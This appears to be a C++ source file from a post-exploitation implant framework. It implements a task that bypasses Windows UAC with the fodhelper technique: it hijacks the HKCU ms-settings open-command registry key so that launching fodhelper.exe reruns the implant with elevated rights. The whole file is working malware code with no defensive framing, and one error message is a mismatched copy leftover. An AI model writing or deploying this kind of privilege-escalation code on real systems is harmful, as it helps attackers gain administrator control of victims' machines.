#include "core/task.hpp"

namespace Task
{
    std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique)
    {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }

        LPCWSTR lpSelfPath = wSelfPath;

        if (wcscmp(wTechnique.c_str(), L"fodhelper") == 0)
        {
            // Reference: https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
            HKEY hKey;
            DWORD d;
            std::wstring wSubKey = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
            std::wstring wCmd = L"cmd /c start " + std::wstring(wSelfPath);
            LPCWSTR lpCmd = wCmd.c_str();
            const WCHAR* wDel = L"";

            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                nullptr,
                0,
                KEY_WRITE,
                nullptr,
                &hKey,
                &d
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
            }

            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"",
                0,
                REG_SZ,
                (BYTE*)lpCmd,
                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set default value for ms-settings command.";
            }

            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"DelegateExecute",
                0,
                REG_SZ,
                (BYTE*)wDel,
                (wcslen(wDel) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set 'DelegateExecute' value for ms-settings command.";
            }

            pState->pProcs->lpRegCloseKey(hKey);

            // Start the fodhelper.exe
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = L"runas";
            sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;

            if (!pState->pProcs->lpShellExecuteExW(&sei))
            {
                return L"Error: Failed to execute shell.";
            }

            return L"Success: The fodhelper.exe and another process started successfully.";
        }

        return L"Error: Invalid technique.";
    }
}